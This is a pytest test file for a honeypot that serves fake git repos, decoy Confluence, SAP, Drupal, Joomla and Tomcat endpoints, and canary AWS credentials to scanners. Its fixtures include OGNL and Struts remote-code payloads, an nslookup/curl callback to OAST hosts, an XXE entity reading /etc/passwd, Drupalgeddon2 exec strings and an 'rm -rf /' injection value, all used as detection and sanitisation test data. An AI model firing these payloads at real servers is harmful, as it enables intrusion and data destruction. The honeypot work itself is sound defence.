    assert extra_hooks <= set(tbenv._FAKE_GIT_HOOK_NAMES)
    for hook_name in tbenv._FAKE_GIT_HOOK_NAMES:
        body = files[f"/.git/hooks/{hook_name}.sample"]
        assert body.startswith(b"#!/bin/sh\n"), hook_name
        assert hook_name.encode("utf-8") in body, hook_name
        # Defensive: the body must not regress to a one-line stub.
        assert body.count(b"\n") >= 5, hook_name


def test_fake_git_repo_covers_common_branch_refs():
    """Scanner enumeration dictionaries walk `refs/heads/<branch>` for
    common branch names (`develop`, `staging`, `production`, …) — a 404
    on every one of them while `main` / `master` return 200 is a strong
    "this is a synthesized fake repo" tell."""
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    sha = meta["commitSha"]
    for branch in tbenv._FAKE_GIT_EXTRA_BRANCHES:
        for key in (
            f"/.git/refs/heads/{branch}",
            f"/.git/refs/remotes/origin/{branch}",
            f"/.git/logs/refs/heads/{branch}",
            f"/.git/logs/refs/remotes/origin/{branch}",
        ):
            assert key in files, f"missing fake-git surface: {key}"
            assert sha in files[key].decode("utf-8"), key


def test_fake_git_repo_covers_stash_and_wip_refs():
    """`refs/stash` + `logs/refs/stash` are present in any repo with a
    saved stash; the git-wip extension adds `refs/wip/index/...` and
    `refs/wip/wtree/...`. Scanners enumerate both — covering them
    closes a measurable miss-rate gap."""
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    sha = meta["commitSha"]
    assert sha in files["/.git/refs/stash"].decode("utf-8")
    assert sha in files["/.git/logs/refs/stash"].decode("utf-8")
    for branch in ("main", "master", *tbenv._FAKE_GIT_EXTRA_BRANCHES):
        for key in (
            f"/.git/refs/wip/index/refs/heads/{branch}",
            f"/.git/refs/wip/wtree/refs/heads/{branch}",
        ):
            assert sha in files[key].decode("utf-8"), key


def test_fake_git_hook_body_is_not_verbatim_git_template():
    # We deliberately do *not* ship git's GPL-licensed template bodies —
    # they would force GPL on Flux. The stub must be our own short prose.
    body = tbenv._fake_git_hook_body("pre-commit").decode("utf-8")
    assert "Redistribution" not in body
    assert "Linus Torvalds" not in body
    # Sanity: the standard git template phrases never appear.
    assert "An example hook script to verify what is about to be committed" not in body


# --- _close_http_session lifecycle ---


async def test_close_http_session_closes_lazy_session():
    # Prime a session, then verify cleanup hook closes it and clears the global.
    session = await tbenv._get_http_session()
    assert not session.closed
    await tbenv._close_http_session(None)
    assert session.closed
    assert tbenv._http_session is None


async def test_close_http_session_is_safe_when_nothing_opened():
    # Reset, then call cleanup with no prior session — must not raise.
    tbenv._http_session = None
    await tbenv._close_http_session(None)
    assert tbenv._http_session is None


# --- /confirm-credentials ---
#
# Tracebit's dashboard only marks an issued canary as "active / deployed"
# once /confirm-credentials is POSTed with its confirmationId. Without
# this, the active-key list stays at whatever was confirmed manually
# (the symptom the user noticed: only 3 active SSH keys despite many
# id_rsa hits). These tests pin down extraction, dispatch, and the
# wiring from issue_credentials.


def test_extract_confirmation_ids_finds_aws_ssh_and_http():
    ids = tbenv._extract_confirmation_ids(FAKE_TRACEBIT)
    assert set(ids) == {"conf-aws-1", "conf-ssh-1", "conf-gup-1", "conf-gc-1"}


def test_extract_confirmation_ids_skips_missing_or_malformed():
    # Empty / non-dict / missing top-level keys — no ids, no exceptions.
    assert tbenv._extract_confirmation_ids({}) == []
    assert tbenv._extract_confirmation_ids(None) == []
    assert tbenv._extract_confirmation_ids("not a dict") == []
    # Block present but the confirmation id is missing or wrong shape.
    assert tbenv._extract_confirmation_ids({"aws": {"awsAccessKeyId": "x"}}) == []
    assert tbenv._extract_confirmation_ids({"ssh": {"sshConfirmationId": ""}}) == []
    assert tbenv._extract_confirmation_ids({"http": {"x": {"confirmationId": None}}}) == []


async def test_schedule_confirmations_fires_one_task_per_id(monkeypatch):
    """_schedule_confirmations creates one create_task per extracted id,
    each calling confirm_credential. Drains the tasks via asyncio.sleep
    so the test is deterministic."""
    seen: list[str] = []

    async def fake_confirm(confirmation_id):
        seen.append(confirmation_id)

    monkeypatch.setattr(tbenv, "confirm_credential", fake_confirm)
    tbenv._schedule_confirmations(FAKE_TRACEBIT)
    # Yield to the event loop so the scheduled tasks run.
    for _ in range(3):
        import asyncio
        await asyncio.sleep(0)
    assert set(seen) == {"conf-aws-1", "conf-ssh-1", "conf-gup-1", "conf-gc-1"}


async def test_schedule_confirmations_no_running_loop_is_silent():
    """Called from a sync context (no loop) — must not raise. Lets us
    keep _schedule_confirmations safe to call from anywhere without
    extra guards at the caller."""
    # Run inside a thread without an event loop.
    import asyncio as _asyncio
    import threading

    errors: list[BaseException] = []

    def runner():
        try:
            tbenv._schedule_confirmations(FAKE_TRACEBIT)
        except BaseException as exc:  # pragma: no cover — failure path
            errors.append(exc)

    t = threading.Thread(target=runner)
    t.start()
    t.join(timeout=1.0)
    assert errors == [], f"unexpected raise: {errors!r}"
    _ = _asyncio  # keep import grouped with the other asyncio uses


class _FakeResp:
    def __init__(self, payload, *, status=200):
        self._payload = payload
        self.status = status
        self.raised = False

    async def __aenter__(self):
        return self

    async def __aexit__(self, *_a):
        return False

    def raise_for_status(self):
        self.raised = True

    async def json(self):
        return self._payload


class _FakeSession:
    def __init__(self):
        self.posts: list[tuple[str, dict]] = []
        self.issue_payload: dict | None = None

    def post(self, url, *, json=None, headers=None):
        self.posts.append((url, json))
        if "confirm-credentials" in url:
            return _FakeResp(None, status=204)
        return _FakeResp(self.issue_payload)


async def test_issue_credentials_posts_confirm_for_each_canary_type(monkeypatch):
    """End-to-end: issue_credentials returns the response and schedules a
    /confirm-credentials POST for every confirmationId in it. This is the
    bug fix — issued SSH keys (and aws / http canaries) now show up as
    active in the Tracebit dashboard."""
    fake = _FakeSession()
    fake.issue_payload = FAKE_TRACEBIT

    async def get_session():
        return fake

    monkeypatch.setattr(tbenv, "_get_http_session", get_session)
    monkeypatch.setattr(tbenv, "API_KEY", "test-key")

    result = await tbenv.issue_credentials(
        request_id="req-1",
        client_ip="203.0.113.50",
        host="trap.example",
        user_agent="curl/8",
        path="/.env",
        proto="https",
    )
    assert result is FAKE_TRACEBIT

    # Drain the scheduled fire-and-forget confirmations.
    import asyncio
    for _ in range(5):
        await asyncio.sleep(0)

    issue_calls = [body for url, body in fake.posts if url.endswith("/issue-credentials")]
    confirm_calls = [body for url, body in fake.posts if url.endswith("/confirm-credentials")]
    assert len(issue_calls) == 1
    assert {body["id"] for body in confirm_calls} == {
        "conf-aws-1", "conf-ssh-1", "conf-gup-1", "conf-gc-1",
    }


async def test_confirm_credential_skips_when_api_key_missing(monkeypatch):
    """No API_KEY → no POST. Mirrors the existing dispatch-time gating
    so tests that null out API_KEY don't accidentally trigger network."""
    posted: list[str] = []

    class _Recorder:
        def post(self, url, **_):
            posted.append(url)
            return _FakeResp(None)

    async def get_session():
        return _Recorder()

    monkeypatch.setattr(tbenv, "_get_http_session", get_session)
    monkeypatch.setattr(tbenv, "API_KEY", "")
    await tbenv.confirm_credential("conf-x")
    assert posted == []


async def test_confirm_credential_swallows_network_errors(monkeypatch):
    """Confirmation is best-effort — a Tracebit outage must not raise
    out of the fire-and-forget task and crash the worker."""
    import aiohttp as _aiohttp

    class _BoomResp:
        async def __aenter__(self):
            raise _aiohttp.ClientConnectionError("connection refused")

        async def __aexit__(self, *_a):
            return False

    class _BoomSession:
        def post(self, *_a, **_kw):
            return _BoomResp()

    async def get_session():
        return _BoomSession()

    monkeypatch.setattr(tbenv, "_get_http_session", get_session)
    monkeypatch.setattr(tbenv, "API_KEY", "test-key")
    # Must return None without raising.
    assert await tbenv.confirm_credential("conf-x") is None


# --- Method handling ---


async def test_dispatch_rejects_unsupported_methods(flux_client):
    """PUT / DELETE / etc. short-circuit to 405. Prevents confused logging
    downstream and stops tarpit/canary logic from running on odd verbs."""
    resp = await flux_client.put("/anything", data=b"x")
    assert resp.status == 405


# --- Confluence trap (CVE-2022-26134 OGNL RCE bait) ---


def test_confluence_enabled_by_default():
    assert tbenv.CONFLUENCE_ENABLED


def test_confluence_default_paths_cover_observed_probes():
    for path in (
        "/pages/createpage-entervariables.action",
        "/confluence/pages/createpage-entervariables.action",
        "/wiki/pages/createpage-entervariables.action",
        "/pages/doenterpagevariables.action",
        "/templates/editor-preload-container",
        "/users/user-dark-features",
        "/login.action",
    ):
        assert tbenv.is_confluence_path(path), f"expected match: {path}"


def test_confluence_path_matches_url_encoded_ognl_in_path():
    # Canonical CVE-2022-26134 path shape — URL-encoded OGNL expression
    # as the first path segment.
    encoded = "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20abc.oast.me%22%29%7D/"
    assert tbenv.is_confluence_path(encoded)
    # Raw (decoded) shape, in case nginx normalises it for us.
    assert tbenv.is_confluence_path("/${@java.lang.Runtime@getRuntime().exec(\"id\")}/")


def test_confluence_path_non_match():
    for path in (
        "/",
        "/index.html",
        "/.env",
        "/pages/",  # too generic
        "/wiki/",   # too generic, no action
        "/pages/foo.html",
    ):
        assert not tbenv.is_confluence_path(path), f"unexpected match: {path}"


def test_confluence_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "CONFLUENCE_ENABLED", False)
    assert not tbenv.is_confluence_path("/pages/createpage-entervariables.action")
    assert not tbenv.is_confluence_path("/${@java.lang.Runtime@getRuntime().exec(\"id\")}/")


def test_confluence_has_ognl_indicators():
    assert tbenv._confluence_has_ognl(
        "/${@java.lang.Runtime@getRuntime().exec(\"x\")}/", "", "",
    )
    assert tbenv._confluence_has_ognl(
        "/%24%7b%40java.lang.runtime%40getruntime%28%29.exec/", "", "",
    )
    assert tbenv._confluence_has_ognl(
        "/pages/createpage-entervariables.action",
        "",
        '${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id"))}',
    )
    assert not tbenv._confluence_has_ognl("/login.action", "", "")
    assert not tbenv._confluence_has_ognl("/pages/", "os_username=admin", "")


def test_confluence_has_ognl_detects_struts_s2_payloads():
    # Apache Struts S2-053/S2-061/S2-066 redirect:${...ProcessBuilder...} shape
    # carried in the query string. The `#`-rooted OGNL variable form drives the
    # xwork.MethodAccessor#denyMethodExecution=false bypass.
    raw_query = (
        "redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]"
        "{'sh','-c','id'})).start(),#b=#a.getInputStream(),#c=new java.io"
        ".InputStreamReader(#b)}"
    )
    assert tbenv._confluence_has_ognl("/index.action", raw_query, "")
    encoded_query = (
        "redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor"
        ".denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess"
    )
    assert tbenv._confluence_has_ognl("/index.action", encoded_query, "")
    # Body-carried variant (some scanners POST the OGNL instead of GET).
    assert tbenv._confluence_has_ognl(
        "/login.action", "",
        "method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=...",
    )


def test_confluence_default_paths_include_bare_index_action():
    assert tbenv.is_confluence_path("/index.action")
    assert tbenv.is_confluence_path("/login.action")


def test_confluence_extract_oast_callback_url_encoded():
    payload = (
        "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"
        "nslookup%20d7o9gl5q3g2u7gjrcdmgdpjnby6nsjaud.oast.me%22%29%7D/"
    )
    assert (
        tbenv._extract_oast_callback(payload)
        == "d7o9gl5q3g2u7gjrcdmgdpjnby6nsjaud.oast.me"
    )


def test_confluence_extract_oast_callback_multi_family():
    for hostname in (
        "abcd.oast.me",
        "abcd.interact.sh",
        "abcd.dnslog.cn",
        "deadbeef.burpcollaborator.net",
    ):
        text = f'curl http://{hostname}/x'
        assert tbenv._extract_oast_callback(text) == hostname


def test_confluence_extract_oast_callback_no_match():
    assert tbenv._extract_oast_callback("") == ""
    assert tbenv._extract_oast_callback("not a callback") == ""
    # Domain has to be the actual TLD — `notoast.me` is its own TLD-eq,
    # `oast.me` must follow a leading label.
    assert tbenv._extract_oast_callback("oast.me") == ""


def test_render_confluence_login_html_shape():
    body = tbenv.render_confluence_login_html("conf.example", "7.18.1").decode("utf-8")
    assert "Confluence" in body
    assert "7.18.1" in body
    assert "conf.example" in body
    assert "/dologin.action" in body
    assert "atl_token" in body


def test_render_confluence_dark_features_json_shape():
    payload = json.loads(tbenv.render_confluence_dark_features_json())
    assert "siteFeatures" in payload
    assert "userFeatures" in payload


# --- Fake SAP NetWeaver Visual Composer MetadataUploader ----------------

def test_sap_metadatauploader_enabled_by_default():
    assert tbenv.SAP_METADATAUPLOADER_ENABLED


@pytest.mark.parametrize("path", [
    "/developmentserver/metadatauploader",
    "/developmentserver/metadatauploader/",
    "/DevelopmentServer/MetadataUploader",
    "/irj/developmentserver/metadatauploader",
    "/nwa/developmentserver/metadatauploader",
    "/sap/developmentserver/metadatauploader",
])
def test_sap_metadatauploader_matches_observed_probes(path):
    assert tbenv.is_sap_metadatauploader_path(path)


@pytest.mark.parametrize("path", [
    "/",
    "/.env",
    "/developmentserver/",
    "/developmentserver/metadatauploader/extra",
    "/metadatauploader",
    "/wp-admin/install.php",
    "/sap/",
])
def test_sap_metadatauploader_non_match(path):
    assert not tbenv.is_sap_metadatauploader_path(path)


def test_sap_metadatauploader_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "SAP_METADATAUPLOADER_ENABLED", False)
    assert not tbenv.is_sap_metadatauploader_path(
        "/developmentserver/metadatauploader",
    )


def test_render_sap_metadatauploader_get_error_shape():
    body = tbenv.render_sap_metadatauploader_get_error().decode("utf-8")
    assert "<?xml" in body
    assert "METADATA_UPLOAD_NO_REQUEST" in body
    assert "sap:Error" in body


def test_render_sap_metadatauploader_post_ok_echoes_filename():
    body = tbenv.render_sap_metadatauploader_post_ok("shell.jsp").decode("utf-8")
    assert body.startswith("OK: stored ")
    assert "shell.jsp" in body
    assert "j2ee/cluster/apps" in body


def test_render_sap_metadatauploader_post_ok_sanitises_filename():
    # A filename with shell metacharacters or path traversal must be
    # sanitised before being echoed back — we don't want flux's response
    # body itself to ship attacker-controlled tokens that downstream
    # log/SIEM pipelines might re-render unsafely.
    body = tbenv.render_sap_metadatauploader_post_ok("../../../etc/passwd; rm -rf /").decode("utf-8")
    assert "rm -rf" not in body
    assert "../" not in body
    assert ";" not in body


def test_render_sap_metadatauploader_post_ok_empty_filename_fallback():
    body = tbenv.render_sap_metadatauploader_post_ok("").decode("utf-8")
    # Falls back to a plausible default rather than emitting an empty path,
    # which would tip off a scanner that the response is templated.
    assert "metadata.xml" in body


def test_sap_metadatauploader_shell_indicators_jsp():
    """The triage flag should fire on the JSP / Runtime.exec() / processbuilder
    shapes scanners use in CVE-2025-31324 upload bodies."""
    for needle in (
        b"<%@ page import=\"java.io.*\" %>",
        b"<jsp:scriptlet>Runtime.getRuntime().exec(\"id\")</jsp:scriptlet>",
        b"ProcessBuilder pb = new ProcessBuilder(\"sh\",\"-c\",cmd);",
        b"<%@ Runtime.getRuntime().exec %>",
    ):
        assert any(
            ind in needle.lower() for ind in tbenv._SAP_METADATAUPLOADER_SHELL_INDICATORS
        )


def test_sap_metadatauploader_xxe_indicators():
    """CVE-2017-9844 ships an XXE payload in the same servlet path —
    triage should fire `hasXxe` on `<!DOCTYPE` / `<!ENTITY` bodies."""
    for needle in (
        b"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        b"<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
    ):
        assert any(
            ind in needle.lower() for ind in tbenv._SAP_METADATAUPLOADER_XXE_INDICATORS
        )


# --- Drupal trap (CVE-2018-7600 Drupalgeddon2 + settings.php canary) ---


def test_drupal_enabled_by_default():
    assert tbenv.DRUPAL_ENABLED


@pytest.mark.parametrize("path", [
    "/user/register",
    "/user/register/",
    "/User/Register",
    "/?q=user/register",
    "/drupal/user/register",
    "/cms/user/register",
])
def test_drupal_matches_observed_register_probes(path):
    assert tbenv.is_drupal_path(path)


@pytest.mark.parametrize("path", [
    # `/user/login` stays with the generic webapp-form responder.
    "/user/login",
    "/user/password",
    "/users/register",
    "/register",
    "/.env",
    "/user",
    "/user/register/extra",
])
def test_drupal_non_match(path):
    assert not tbenv.is_drupal_path(path)


def test_drupal_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "DRUPAL_ENABLED", False)
    assert not tbenv.is_drupal_path("/user/register")


def test_drupal_does_not_steal_user_login_from_webapp_form():
    """`/user/login` must continue to route to the generic
    web-app form responder — it has tested credential capture and
    we should not regress the result tag by stealing the path."""
    assert not tbenv.is_drupal_path("/user/login"), (
        "Drupal handler must not match /user/login — that path is "
        "owned by the generic webapp-form responder."
    )
    assert tbenv.is_webapp_form_path("/user/login"), (
        "/user/login must remain a webapp-form path."
    )


def test_drupal_drupalgeddon2_indicators_query():
    """A real Drupalgeddon2 exploit URL embeds these in the query
    string; the triage flag should fire on every one."""
    for needle in (
        b"element_parents=account/mail/%23value",
        b"_wrapper_format=drupal_ajax",
        b"ajax_form=1",
        b"mail[#post_render][]=passthru",
        b"mail[#markup]=id",
    ):
        assert any(
            ind in needle.lower() for ind in tbenv._DRUPAL_DRUPALGEDDON2_INDICATORS
        )


def test_drupal_rce_payload_indicators():
    """Drupalgeddon2 bodies usually pair a render-array indicator
    with a PHP exec primitive. Both flags fire so triage can sort
    fingerprint hits from RCE attempts."""
    for needle in (
        b"passthru('id')",
        b"system('whoami')",
        b"shell_exec('cat /etc/passwd')",
        b"phpinfo();",
        b"base64_decode('...')",
    ):
        assert any(
            ind in needle.lower() for ind in tbenv._DRUPAL_RCE_PAYLOAD_INDICATORS
        )


def test_render_drupal_user_register_html_shape():
    body = tbenv.render_drupal_user_register_html(
        "9.5.11", "form-build-XYZ", "form-token-ABC",
    ).decode("utf-8")
    assert 'Generator' in body
    assert 'Drupal 9.5.11' in body
    assert 'user-register-form' in body
    assert 'form-build-XYZ' in body
    assert 'form-token-ABC' in body
    assert 'name="mail"' in body
    assert 'name="form_token"' in body


def test_render_drupal_user_register_html_version_sanitised():
    """A version string with shell metas / HTML must not bleed into
    the rendered body — flux's own response must never ship
    attacker-controlled tokens that downstream pipelines could
    re-render unsafely."""
    body = tbenv.render_drupal_user_register_html(
        "9.5.11<script>alert(1)</script>", "fb", "ft",
    ).decode("utf-8")
    assert "<script>" not in body
    assert "alert(1)" not in body


def test_render_drupal_ajax_response_is_valid_json():
    import json as _json
    body = tbenv.render_drupal_ajax_response().decode("utf-8")
    parsed = _json.loads(body)
    assert isinstance(parsed, list)
    assert parsed[0]["command"] == "insert"
    assert parsed[0]["method"] == "replaceWith"


def test_render_drupal_settings_php_includes_per_hit_db_password():
    """Per-hit synthetic DB password — never a fixed literal across
    sensors. Two back-to-back renders must produce different
    passwords."""
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE",
        "awsSecretAccessKey": "SECRETEXAMPLE",
        "awsSessionToken": "TOKENEXAMPLE",
    }}
    a = tbenv.render_drupal_settings_php(aws).decode("utf-8")
    b = tbenv.render_drupal_settings_php(aws).decode("utf-8")
    # Both contain the canary creds
    assert "AKIAEXAMPLE" in a
    assert "AKIAEXAMPLE" in b
    # Both look like Drupal settings.php
    assert "$databases['default']['default']" in a
    assert "$settings['hash_salt']" in a
    # DB password is per-hit unique
    import re as _re
    m_a = _re.search(r"'password' => '([^']+)'", a)
    m_b = _re.search(r"'password' => '([^']+)'", b)
    assert m_a and m_b
    assert m_a.group(1) != m_b.group(1), (
        "DB password must be per-hit unique — two consecutive renders "
        "produced the same value, which is a fleet-wide fingerprint."
    )


def test_drupal_settings_php_is_a_canary_trap():
    assert "/sites/default/settings.php" in tbenv._TRAP_BY_PATH
    assert "/sites/default/settings.php.bak" in tbenv._TRAP_BY_PATH
    assert "/sites/default/default.settings.php" in tbenv._TRAP_BY_PATH
    assert "/drupal/sites/default/settings.php" in tbenv._TRAP_BY_PATH
    # Absolute-webroot path-traversal variants
    assert "/var/www/sites/default/settings.php" in tbenv._TRAP_BY_PATH
    assert "/var/www/html/sites/default/settings.php" in tbenv._TRAP_BY_PATH
    assert "/srv/www/sites/default/settings.php" in tbenv._TRAP_BY_PATH


# ---- Joomla 4 public-config disclosure (CVE-2023-23752) ----------------

def test_joomla4_config_enabled_by_default():
    assert tbenv.JOOMLA4_CONFIG_ENABLED


@pytest.mark.parametrize("path", [
    "/api/index.php/v1/config/application",
    "/api/index.php/v1/config/application/",
    "/API/INDEX.PHP/V1/CONFIG/APPLICATION",
    "/api/index.php/v1/config/com_users",
    "/api/index.php/v1/config/com_config",
])
def test_joomla4_matches_observed_config_probes(path):
    assert tbenv.is_joomla4_config_path(path)


@pytest.mark.parametrize("path", [
    "/api/index.php/v1/users",
    "/api/index.php/v2/config/application",
    "/index.php",
    "/.env",
    "/config/application.yml",
])
def test_joomla4_non_match(path):
    assert not tbenv.is_joomla4_config_path(path)


def test_joomla4_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "JOOMLA4_CONFIG_ENABLED", False)
    assert not tbenv.is_joomla4_config_path("/api/index.php/v1/config/application")


def test_render_joomla4_config_public_carries_canary():
    """`?public=true` is the disclosure trigger — the body must include
    the canary AWS triple in the `filesystem.s3.*` slots a real Joomla 4
    s3-storage-driver leak exposes."""
    import json as _json
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE",
        "awsSecretAccessKey": "SECRETEXAMPLE",
        "awsSessionToken": "TOKENEXAMPLE",
    }}
    body = tbenv.render_joomla4_config_application(
        aws, "application", public=True,
    ).decode("utf-8")
    parsed = _json.loads(body)
    attrs = parsed["data"][0]["attributes"]
    assert attrs["filesystem.s3.access_key"] == "AKIAEXAMPLE"
    assert attrs["filesystem.s3.secret_key"] == "SECRETEXAMPLE"
    assert attrs["filesystem.s3.session_token"] == "TOKENEXAMPLE"
    # Joomla-shape fields scanners grep for
    assert "secret" in attrs
    assert "smtppass" in attrs
    assert attrs["dbtype"] == "mysqli"


def test_render_joomla4_config_non_public_is_access_denied():
    """Without `?public=true` the WebService returns an `errors`
    envelope — the same shape real Joomla 4 returns when the access
    flag is absent."""
    import json as _json
    body = tbenv.render_joomla4_config_application(
        {}, "application", public=False,
    ).decode("utf-8")
    parsed = _json.loads(body)
    assert "errors" in parsed
    assert parsed["errors"][0]["code"] == "401"


def test_render_joomla4_config_per_hit_passwords_unique():
    """DB password and SMTP password must be per-hit unique — two
    consecutive renders share the canary AKIA but produce different
    `password` / `smtppass` values."""
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE",
        "awsSecretAccessKey": "SECRETEXAMPLE",
        "awsSessionToken": "TOKENEXAMPLE",
    }}
    import json as _json
    a = _json.loads(tbenv.render_joomla4_config_application(aws, "application", True))
    b = _json.loads(tbenv.render_joomla4_config_application(aws, "application", True))
    assert a["data"][0]["attributes"]["password"] != b["data"][0]["attributes"]["password"]
    assert a["data"][0]["attributes"]["smtppass"] != b["data"][0]["attributes"]["smtppass"]
    assert a["data"][0]["attributes"]["secret"] != b["data"][0]["attributes"]["secret"]


def test_render_joomla4_config_component_sanitised():
    """A component slug with shell metas must not bleed into the JSON
    body — flux's own response must never ship attacker-controlled
    tokens that downstream pipelines could re-render unsafely."""
    body = tbenv.render_joomla4_config_application(
        {}, "com_users<script>", public=True,
    ).decode("utf-8")
    # Sanitisation collapses anything non-alphanumeric/_ to "application".
    assert "<script>" not in body


# ---- Tomcat `/..;/env.*` path-normalization bypass ---------------------

def test_tomcat_path_bypass_enabled_by_default():
    assert tbenv.TOMCAT_PATH_BYPASS_ENABLED


@pytest.mark.parametrize("path", [
    "/..;/env.js",
    "/..;/env.dev.js",
    "/..;/env.prod.js",
    "/..;/env.production.js",
    "/..;/env.development.js",
    "/..;/ENV.JS",
    "/static/..;/env.js",
    "/api/..;/..;/env.prod.js",
])
def test_tomcat_path_bypass_matches_observed_probes(path):
    assert tbenv.is_tomcat_path_bypass_path(path)


@pytest.mark.parametrize("path", [
    # Plain .env probes — owned by the canary `/.env` trap.
    "/.env",
    "/env.js",
    "/static/env.js",
    # Tomcat path-param without env.js suffix — out of scope.
    "/..;/admin",
    "/..;/wp-config.php",
    # F5 BIG-IP TMUI bypass — owned by the F5 handler.
    "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
    # Other product bypass shapes — these go to whoever owns them.
    "/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agg",
])
def test_tomcat_path_bypass_non_match(path):
    assert not tbenv.is_tomcat_path_bypass_path(path)


def test_tomcat_path_bypass_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "TOMCAT_PATH_BYPASS_ENABLED", False)
    assert not tbenv.is_tomcat_path_bypass_path("/..;/env.prod.js")


def test_render_tomcat_path_bypass_env_js_carries_canary():
    """The env.js body must embed the canary AWS triple in the
    REACT_APP_AWS_* / VITE_AWS_* / NEXT_PUBLIC_AWS_* slots scrapers
    grep for. Also assert the per-hit Sentry/Firebase/Stripe filler
    is present so the body looks like a real bundle."""
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE",
        "awsSecretAccessKey": "SECRETEXAMPLE",
        "awsSessionToken": "TOKENEXAMPLE",
    }}
    body = tbenv.render_tomcat_path_bypass_env_js(aws, "env.prod.js").decode("utf-8")
    assert "AKIAEXAMPLE" in body
    assert "SECRETEXAMPLE" in body
    assert "TOKENEXAMPLE" in body
    assert "REACT_APP_AWS_ACCESS_KEY_ID" in body
    assert "VITE_AWS_ACCESS_KEY_ID" in body
    assert "NEXT_PUBLIC_AWS_ACCESS_KEY_ID" in body
    assert "REACT_APP_SENTRY_DSN" in body
    assert "REACT_APP_STRIPE_PUBLISHABLE_KEY" in body
    assert "env.prod.js" in body  # filename echoed in comment
    # Body starts with the canonical bundle-style header
    assert body.startswith("//")


def test_render_tomcat_path_bypass_env_js_per_hit_sentry_unique():
    """Sentry public key + app id are per-hit — two consecutive
    renders with the same canary AWS triple must still differ on the
    non-canary filler."""
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE",
        "awsSecretAccessKey": "SECRETEXAMPLE",
        "awsSessionToken": "TOKENEXAMPLE",
    }}
    a = tbenv.render_tomcat_path_bypass_env_js(aws, "env.js").decode("utf-8")
    b = tbenv.render_tomcat_path_bypass_env_js(aws, "env.js").decode("utf-8")
    assert a != b, (
        "Sentry public key / project id / firebase app id / stripe pk "
        "must be per-hit — two consecutive renders produced the same "
        "body, which is a fleet-wide fingerprint."
    )


def test_render_tomcat_path_bypass_env_js_filename_sanitised():
    """A filename with HTML metacharacters must not bleed into the
    body comment unsafely."""
    aws = {"aws": {"awsAccessKeyId": "", "awsSecretAccessKey": "", "awsSessionToken": ""}}
    body = tbenv.render_tomcat_path_bypass_env_js(
        aws, "env.js" + "<script>alert(1)</script>",
    ).decode("utf-8")
    # Truncated to 64 chars; alert(1) won't fit + tag remains a comment-only line
    # but ensure the rendered body doesn't break on the path metadata layer.
    assert "AKIA" not in body  # empty canary still empty
    assert body.count("\n") >= 3  # multi-line bundle


# ---- Webapp runtime-config bundle (`/env.js`, `/config.production.js`,
# `/config.production.json`, …) ------------------------------------------

@pytest.mark.parametrize("path", [
    # Bare leaves
    "/env.js", "/config.js", "/app.js", "/main.js", "/index.js",
    "/env.production.js", "/env.development.js", "/env.dev.js", "/env.prod.js",
    "/config.production.js", "/config.local.js",
    # Build-pipeline prefixes
    "/src/config.js", "/web/config.js", "/app/config.js", "/api/config.js",
    "/public/config.js", "/assets/config.js", "/static/config.js",
    "/src/api/config.js", "/web/api/config.js",
    "/static/js/config.js", "/public/js/config.js",
    "/config/config.js",
])
def test_webapp_config_bundle_js_is_a_canary_trap(path):
    trap = tbenv._TRAP_BY_PATH.get(path)
    assert trap is not None, f"{path!r} should be a CanaryTrap entry"
    assert trap.name == "webapp-config-bundle-js"
    assert trap.content_type.startswith("application/javascript")


@pytest.mark.parametrize("path", [
    # Bare leaves
    "/configuration.json", "/production.json", "/configs.json",
    "/config.production.json", "/config.development.json",
    "/config.dev.json", "/config.prod.json", "/config.local.json",
    # Prefixed variants the lockstep scanner walks
    "/assets/config.production.json", "/assets/configs.json",
    "/src/config.production.json", "/static/configuration.json",
])
def test_webapp_config_bundle_json_is_a_canary_trap(path):
    trap = tbenv._TRAP_BY_PATH.get(path)
    assert trap is not None, f"{path!r} should be a CanaryTrap entry"
    assert trap.name == "webapp-config-bundle-json"
    assert trap.content_type.startswith("application/json")


@pytest.mark.parametrize("path", [
    # These have their own dedicated traps and MUST NOT be claimed by
    # the webapp-config-bundle traps (which would change the response
    # shape and the result tag).
    "/config.json", "/settings.json", "/credentials.json", "/secrets.json",
    # The Next.js / Vite / Tomcat env.js bypass shape stays with the
    # tomcat-path-bypass handler.
    "/..;/env.js", "/..;/env.production.js",
    # Real WordPress / app paths must not be swallowed.
    "/wp-config.php",
    "/.env",
    "/.git/config",
])
def test_webapp_config_bundle_does_not_clobber_other_traps(path):
    trap = tbenv._TRAP_BY_PATH.get(path)
    if trap is not None:
        assert not trap.name.startswith("webapp-config-bundle-"), (
            f"{path!r} should NOT be a webapp-config-bundle trap"
        )


def test_render_webapp_config_bundle_js_carries_canary():
    aws = {"aws": {
        "awsAccessKeyId": "AKIAEXAMPLE",
        "awsSecretAccessKey": "SECRETEXAMPLE",
        "awsSessionToken": "TOKENEXAMPLE",
    }}
    body = tbenv.render_webapp_config_bundle_js(aws).decode("utf-8")
    assert "AKIAEXAMPLE" in body
    assert "SECRETEXAMPLE" in body
    assert "TOKENEXAMPLE" in body
    assert "REACT_APP_AWS_ACCESS_KEY_ID" in body
